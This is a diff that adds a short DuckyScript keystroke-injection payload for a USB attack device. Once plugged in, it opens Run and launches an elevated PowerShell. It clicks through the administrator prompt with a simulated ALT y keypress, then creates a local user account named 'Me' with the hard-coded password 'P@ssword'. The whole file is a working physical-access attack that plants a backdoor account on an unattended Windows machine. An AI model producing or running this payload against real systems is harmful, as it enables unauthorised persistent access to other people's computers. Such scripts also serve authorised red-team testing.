@@ -1,0 +1,14 @@
+#script to create a new account via PS. You will be prompted to verify the account is created under admin
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell Start-Process PowerShell -Verb RunAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 1000
+STRING New-LocalUser -Name "Me" -Password (ConvertTo-SecureString "P@ssword" -AsPlainText -Force) -Description "New User Account"
+ENTER
+DELAY 500
+STRING exit
+ENTER
